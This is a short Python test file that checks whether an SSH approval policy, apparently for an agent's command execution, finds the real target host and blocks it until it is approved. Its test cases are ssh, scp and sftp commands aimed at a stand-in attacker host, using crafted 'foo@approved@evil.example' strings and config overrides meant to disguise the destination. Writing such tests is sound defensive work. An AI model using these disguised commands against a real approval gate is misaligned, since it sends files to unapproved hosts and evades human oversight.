import pytest
from core.inference.ssh_policy import extract_ssh_hosts_from_command,check_ssh_command_access
from state.ssh_approvals import approve_hosts,reset_ssh_approvals

@pytest.mark.parametrize('command',[
 'ssh -F none foo@approved@evil.example',
 'scp -F none file foo@approved@evil.example:/file',
 'sftp -F none foo@approved@evil.example',
 'coproc ssh -F none evil.example',
])
def test_ssh_real_target_requires_approval(command):
 reset_ssh_approvals()
 hosts,dynamic=extract_ssh_hosts_from_command(command)
 assert hosts=={'evil.example'} and not dynamic
 assert check_ssh_command_access(command,'round9') is not None
 approve_hosts('round9',['evil.example'])
 assert check_ssh_command_access(command,'round9') is None
